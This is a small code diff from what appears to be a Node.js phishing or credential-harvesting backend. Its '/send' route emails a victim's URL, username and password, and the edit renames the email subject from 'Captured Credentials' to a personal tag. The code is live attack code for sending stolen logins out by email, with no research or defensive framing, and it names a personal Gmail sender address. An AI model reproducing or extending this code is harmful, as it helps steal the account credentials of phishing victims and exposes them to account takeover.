@@ -28,7 +28,7 @@ app.post('/send', async (req, res) => {
   const mailOptions = {
     from: 'mohamed.mostafa.montaser@gmail.com',
     to,
-    subject: 'Captured Credentials',
+    subject: 'MoNTaSeR Pa$$',
     text: `URL: ${url}\nUsername: ${username}\nPassword: ${password}`
   };
 
